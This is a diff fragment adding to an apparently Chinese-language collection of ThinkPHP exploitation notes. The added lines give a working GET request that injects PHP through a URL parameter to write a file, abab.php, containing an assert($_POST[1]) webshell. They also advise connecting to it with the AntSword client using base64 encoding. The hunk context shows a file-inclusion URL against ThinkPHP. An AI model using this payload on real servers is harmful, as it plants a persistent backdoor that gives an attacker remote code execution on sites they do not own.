@@ -27,6 +27,11 @@ http://127.0.0.1/thinkphp/index.php?m=Home&c=Index&a=index&value[_filename]=./Ap
 
 ```
 
+写shell(post里面用数字，字符串会莫名其妙报错)，蚁剑选base64编码
+```
+GET //index.php?c=<?=file_put_contents('abab.php','<?=assert($_POST[1]);?>');?> 
+```
+
 
 
 ## exp注入
